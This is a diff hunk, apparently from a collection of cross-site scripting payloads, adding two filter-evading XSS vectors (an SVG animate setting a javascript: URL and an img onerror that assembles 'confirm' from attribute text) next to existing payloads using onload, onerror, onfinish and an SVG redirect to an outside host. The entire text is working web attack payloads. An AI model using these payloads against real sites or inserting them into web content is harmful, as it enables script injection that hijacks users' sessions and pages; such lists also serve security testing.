@@ -1690,3 +1690,5 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <marquee loop=1 width=0 onfinish=confirm(1)>0</marquee>
 <abeon style=font-size:12px onmouseover=confirm(1)>abeon
 <svg onload=location='//p0.al'>
+<svg><animate href=#x attributeName=href values="&#x3000;javascript:alert(5)"/><a id=x><circle r=100>
+<img src='x'alt='con'lang='firm'onerror=top[alt+lang](document.domain)>
